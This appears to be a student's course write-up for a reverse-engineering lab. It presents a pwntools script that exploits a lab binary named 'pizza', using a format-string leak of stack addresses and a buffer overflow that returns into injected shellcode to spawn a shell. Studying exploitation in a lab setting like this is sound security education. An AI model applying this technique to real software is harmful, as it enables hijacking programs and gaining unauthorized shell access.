# Control Flow Integrity Violation

## Summary of the assignment
Before we started this assignment we had to do some preliminary tasks to get started...

* Install pwntools.
* Download the victim program "pizza".
* Attempt to run and crash the program successfully or in other words get the "segmentation fault".
* Open the victim program and analyze it in Ghidra.

Then we can start to write a Python transcript from the sample in order to crash the code and analyze the core dump.

## Script and Explanation

### Python Script
```python
#!/usr/bin/env python3
from pwn import *

# Stack Printing
def stackPrint(core, num = 20):
    rsp = core.rsp
    print("Stack")
    x = num // 2
    addresses = []
    # calculation and storing of the first half of the memory addresses
    for i in range(x, 0, -1):
        tmp = rsp + 8 * i
        addresses.append(tmp)

    # Print first address
    for addr in addresses:
        print(f"{addr:x}\t{core.read(addr, 8)}")

    # Print Stack Pointer
    print(f"{rsp:x}\t{core.read(rsp, 8)} <<<<< RSP")

    # Print second half
    for i in range(x -1, 0, -1):
        tmp = rsp -8 * i
        print(f"{tmp:x}\t{core.read(tmp, 8)}")
    
    stackPrint(core, num=10)

#context.log_level = 'error'

# Executable and Linkable Format
elf = ELF("./pizza")

context(arch='amd64', os='linux', endian='little', word_size=64)

#getname_address = elf.symbols["getname"]

shellcode = asm(shellcraft.amd64.linux.sh())

#print(f"Shellcode: {shellcode.hex().upper()}")
#print(len(shellcode))
victim = process("./pizza")

input1 = b"%p %p %p %p %p %p %p %p %p"



print(str(victim.recvline(), "latin-1"))
victim.sendline(input1)

var = str(victim.recvline(), "latin-1")
print(var)

# Substract offsetto the start of shellcode
addr = int(var.split(" ")[7],16) -112

input2 = shellcode + b"T"*88 + addr.to_bytes(8, 'little')
var = str(victim.recvline(), "latin-1")
victim.sendline(b"4")

victim.sendline(input2)

victim.interactive()

victim.wait()

exit()
```

### Explanation and Screenshots
In order to crash the victim program we had to to figure out some vulnerabilities of the code, basically breaking the code as a user of it. Once we have figured out how to create a segmentation fault then we can come up with a way to inject to the victim program our code and start figuring out how to find the right offset so we can take over our victim program.

The way the offset is calculated is that you have to find the return address in order to call our shellcode, once thats set then recognize the overwrite address to properly open the shellcode terminal and successfully take control of that. Even though a helping function to print the stack is not necessary it does make life easier and speeds up the process of finding the right place to overwrite the address. Also, feeding the program with two inputs is crucial, using either an excessive amount of the same character ``` TTTTTTTTTTT...TTTTT ``` or what we used ```%P``` you can get what's going to cause that program control.

#### Screenshot
![Screenshot from 2024-05-03 13-37-37](https://github.com/erickn02/CS479-579-Reverse-Engineering-at-NMSU/assets/111537523/478e08f7-9423-456a-a8a4-2c8c0ee43e02)

